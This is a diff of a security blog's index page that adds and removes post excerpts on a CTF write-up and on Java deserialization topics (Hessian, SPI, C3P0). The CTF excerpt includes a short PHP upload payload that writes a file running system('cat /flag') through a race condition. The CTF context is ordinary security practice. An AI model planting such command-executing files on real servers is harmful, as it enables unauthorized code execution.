@@ -145,6 +145,142 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/" class="post-title-link" itemprop="url">SICTF_汪汪队WP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-09-11 08:52:35 / Modified: 10:53:27" itemprop="dateCreated datePublished" datetime="2023-09-11T08:52:35+08:00">2023-09-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="SICTF–汪汪队WP"><a href="#SICTF–汪汪队WP" class="headerlink" title="SICTF–汪汪队WP"></a>SICTF–汪汪队WP</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="你能跟得上我的speed吗"><a href="#你能跟得上我的speed吗" class="headerlink" title="你能跟得上我的speed吗"></a>你能跟得上我的speed吗</h2><p>一个条件竞争，上传一个test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;web.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/09/11/SICTF-%E6%B1%AA%E6%B1%AA%E9%98%9FWP/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/08/22/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/22/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">Hessian反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-08-22 10:17:41 / Modified: 10:18:02" itemprop="dateCreated datePublished" datetime="2023-08-22T10:17:41+08:00">2023-08-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h1><h2 id="什么是Hessian？"><a href="#什么是Hessian？" class="headerlink" title="什么是Hessian？"></a>什么是Hessian？</h2><p>Hessian 是一种基于二进制协议的网络传输协议，用于通过网络在不同的系统之间进行远程方法调用（RPC）。它以其高效、简单和易于使用而受到广泛关注。</p>
+<p>Hessian 协议使用二进制编码来序列化对象，并通过网络传输这些二进制数据。相比于文本协议（如XML或JSON），二进制协议可以显著减少传输的数据量，提高传输效率。</p>
+<p>Hessian 协议支持多种编程语言，使得不同语言的应用程序可以方便地进行跨语言的远程方法调用。通常，开发人员只需定义接口和方法，然后在客户端和服务器端分别实现这些接口，Hessian 协议会负责将方法调用请求和响应进行序列化和反序列化，从而实现远程过程调用。</p>
+<p>Hessian 在一些 Java 后端框架中应用广泛，例如 Dubbo、Spring 等。它具有轻量级、高性能、跨语言等特点，适用于构建分布式系统或者跨语言的微服务架构。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/08/22/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/08/20/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -696,139 +832,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/08/05/SPI%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ycxlo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ycx's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/05/SPI%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">SPI机制的安全问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-05 14:24:56 / Modified: 14:25:19" itemprop="dateCreated datePublished" datetime="2023-08-05T14:24:56+08:00">2023-08-05</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="SPI机制的安全问题"><a href="#SPI机制的安全问题" class="headerlink" title="SPI机制的安全问题"></a>SPI机制的安全问题</h1><h2 id="什么是SPI？"><a href="#什么是SPI？" class="headerlink" title="什么是SPI？"></a>什么是SPI？</h2><p>Service Provider Interface，是JDK内置的⼀种服务提供发现机制，可以⽤来启动框架扩 展和替换组建。服务提供接⼝，不同⼚商可以针对同⼀个接⼝做出不同的实现。 当服务提供者提供了⼀种接⼝的实现之后，需要在classpath下的 META-INF&#x2F;services&#x2F; ⽬录 下创建⼀个以服务接⼝命名的⽂件，⽂件内容就是这个接⼝的具体实现类。 当程序需要这个服务时，就可以通过查找这个jar包的 META-INF&#x2F;services&#x2F; 中的配置⽂件， 配置⽂件中有接⼝的具体实现类名，可以根据这个类名进⾏加载实例化。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/05/SPI%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/08/05/C3P0-GADGET/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ycxlo">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ycx's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/08/05/C3P0-GADGET/" class="post-title-link" itemprop="url">C3P0_GADGET</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-08-05 14:23:49 / Modified: 14:24:24" itemprop="dateCreated datePublished" datetime="2023-08-05T14:23:49+08:00">2023-08-05</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="C3P0-Gadget"><a href="#C3P0-Gadget" class="headerlink" title="C3P0 Gadget"></a>C3P0 Gadget</h1><h2 id="什么是C3P0？"><a href="#什么是C3P0？" class="headerlink" title="什么是C3P0？"></a>什么是C3P0？</h2><p>C3P0是一个开源的Java数据库连接池库。它提供了高效、可靠和可定制的连接池管理，用于管理与数据库的连接。</p>
-<p>数据库连接池的主要目的是在应用程序和数据库之间维护一组预先创建的数据库连接，并在需要时重复使用这些连接，以减少连接的创建和关闭过程所产生的开销。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/08/05/C3P0-GADGET/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -898,7 +901,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">69</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
